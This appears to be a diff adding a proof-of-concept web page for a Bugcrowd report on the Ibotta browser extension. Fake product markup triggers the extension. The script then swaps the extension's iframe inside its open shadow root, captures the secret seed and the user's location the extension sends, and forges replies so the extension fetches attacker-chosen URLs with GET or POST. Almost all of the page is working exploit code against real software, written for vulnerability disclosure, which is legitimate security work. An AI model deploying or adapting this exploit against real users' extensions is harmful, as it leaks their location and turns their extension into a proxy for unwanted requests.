@@ -1,0 +1,160 @@
+<!doctype html>
+<html><head><meta charset="utf-8">
+<title>Test Widget 500</title>
+
+<!-- The extension's price-comparison path expects a product to parse. -->
+<script type="application/ld+json">
+{"@context":"https://schema.org/","@type":"Product","name":"Test Widget 500",
+ "sku":"TW500","gtin12":"012345678905","brand":{"@type":"Brand","name":"TestBrand"},
+ "image":["https://example.invalid/i.png"],"description":"A test widget.",
+ "offers":{"@type":"Offer","sku":"TW500","price":"19.99","priceCurrency":"USD",
+ "availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition",
+ "seller":{"@type":"Organization","name":"TestBrand"}}}
+</script>
+
+<style>
+ body{font:14px/1.5 system-ui,sans-serif;margin:24px;max-width:900px}
+ h1{font-size:18px} h2{font-size:14px;margin:20px 0 6px}
+ button{font:inherit;padding:6px 10px;margin:0 6px 6px 0}
+ input{font:inherit;padding:5px;width:420px}
+ pre{background:#f4f4f4;padding:10px;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+ #status b{display:inline-block;min-width:150px}
+ .y{color:#0a0;font-weight:700} .n{color:#a00;font-weight:700}
+ .note{color:#555;font-size:13px}
+</style>
+</head><body>
+
+<h1>Test Widget 500 &mdash; $19.99</h1>
+<p class="note">Security test page for a Bugcrowd submission to Ibotta. Not a real store, not
+affiliated with any retailer. Nothing here runs by itself; press the buttons in order.</p>
+
+<p><b>This page's origin:</b> <code id="org"></code></p>
+
+<h2>1. Has the extension injected its frame?</h2>
+<button onclick="checkStatus()">Check</button>
+<div id="status"><i>not checked yet</i></div>
+<p class="note">If the frame never appears: the tab must be focused, the extension needs a minute
+after install to fetch its store config, and the URL must contain <code>/pd</code>.</p>
+
+<h2>2. Replace the frame with our own</h2>
+<button onclick="swap()">Swap</button>
+<span id="swapped"></span>
+
+<h2>3. What the extension sends us</h2>
+<p class="note">Once swapped, the extension posts its parse request into our iframe. Everything it
+sends is printed below, including the arguments.</p>
+<div id="seed"></div>
+<div id="loc"></div>
+
+<h2>4. Make the extension fetch something</h2>
+<p>URL: <input id="url" value="https://testorg-1-bugbounty.github.io/poc1/register.html"></p>
+<button onclick="arm('GET')">Arm GET</button>
+<button onclick="arm('POST')">Arm POST</button>
+<button onclick="pageFetch()">Control: fetch it from this page instead</button>
+<p class="note">Arming stores a request descriptor. The next parse request we intercept gets answered
+with it. The fetched body comes back inside a later parse call, so watch the log.</p>
+
+<h2>Log</h2>
+<button onclick="document.getElementById('log').textContent=''">Clear</button>
+<pre id="log"></pre>
+
+<script>
+const $ = id => document.getElementById(id);
+$('org').textContent = location.origin + location.pathname;
+
+let armed = null, lastSeed = null;
+
+function log(label, val){
+  const t = new Date().toISOString().slice(11,23);
+  const body = typeof val === 'string' ? val : JSON.stringify(val, null, 1);
+  $('log').textContent += `[${t}] ${label}\n${body}\n\n`;
+}
+
+function shadow(){
+  const host = document.querySelector('#ibotta-extension-root');
+  return host ? host.shadowRoot : null;
+}
+
+function checkStatus(){
+  const host = document.querySelector('#ibotta-extension-root');
+  const sr = shadow();
+  const pc = sr ? sr.querySelector('#ibotta-pc') : null;
+  const yn = v => v ? '<span class="y">yes</span>' : '<span class="n">no</span>';
+  $('status').innerHTML =
+      `<b>extension root:</b> ${yn(!!host)}<br>` +
+      `<b>shadow root open:</b> ${yn(!!sr)}<br>` +
+      `<b>#ibotta-pc present:</b> ${yn(!!pc)}` +
+      (pc ? `<br><b>its src:</b> <code>${pc.src}</code>` : '');
+  log('status check', {root:!!host, shadowOpen:!!sr, frame:!!pc, src: pc ? pc.src : null});
+}
+
+function swap(){
+  const sr = shadow();
+  if (!sr) { alert('No open shadow root yet. Press Check first.'); return; }
+  const old = sr.querySelector('#ibotta-pc');
+  if (old) { log('removing the real frame', old.src); old.remove(); }
+
+  const f = document.createElement('iframe');
+  f.id = 'ibotta-pc';                 // same id, so the extension re-queries and finds ours
+  f.style.display = 'none';           // no src: about:blank, same-origin, so we can listen inside it
+  sr.appendChild(f);
+  f.contentWindow.addEventListener('message', onFrameMessage);
+
+  $('swapped').innerHTML = ' <span class="y">swapped</span>';
+  log('inserted our own iframe under the same id', '#ibotta-pc');
+}
+
+function onFrameMessage(e){
+  const d = e.data;
+  log('message the extension sent INTO our frame', d);
+  if (!d || d.type !== 'run-processor' || !d.data) return;
+
+  lastSeed = d.data.seed;
+  $('seed').innerHTML = `<b>seed:</b> <code>${lastSeed}</code> ` +
+    `<span class="note">&mdash; this is the value its reply listener requires, and it just gave it to us</span>`;
+
+  const args = d.data.args || [];
+  const loc = args.find(a => a && typeof a === 'object' && ('zip' in a || 'latitude' in a));
+  if (loc) $('loc').innerHTML = `<b>location handed to this page, with no prompt:</b> <code>${JSON.stringify(loc)}</code>`;
+
+  const bodies = args.filter(a => typeof a === 'string' && a.length && !a.startsWith('<'));
+  if (bodies.length) log('strings in the arguments (a fetched body arrives here)', bodies.map(s => s.slice(0,600)));
+
+  if (armed){
+    window.top.postMessage({type:'run-processor-' + lastSeed, data: armed}, '*');
+    log('we answered as the frame', armed);
+    armed = null;
+  }
+}
+
+function arm(method){
+  const url = $('url').value.trim();
+  if (!url) return;
+  armed = {method, url, headers:{'X-Injected-By':'the-web-page'}};
+  if (method === 'POST'){
+    armed.headers['Content-Type'] = 'application/json';
+    armed.body = JSON.stringify({from:'the-web-page'});
+  }
+  log('armed. the next parse request will be answered with this', armed);
+}
+
+async function pageFetch(){
+  const url = $('url').value.trim();
+  try {
+    const r = await fetch(url, {credentials:'include'});
+    log('CONTROL, this page fetched it itself: allowed', (await r.text()).slice(0,600));
+  } catch (err) {
+    log('CONTROL, this page fetched it itself: BLOCKED', String(err));
+  }
+}
+
+// The only thing that runs on its own: the extension injects its frame when it wants to,
+// so watch for it appearing and say so. It does not touch the frame.
+new MutationObserver(() => {
+  if (document.querySelector('#ibotta-extension-root') && !window.__seen){
+    window.__seen = true;
+    log('the extension added #ibotta-extension-root to this page', '');
+  }
+}).observe(document.documentElement, {childList:true, subtree:true});
+</script>
+</body></html>
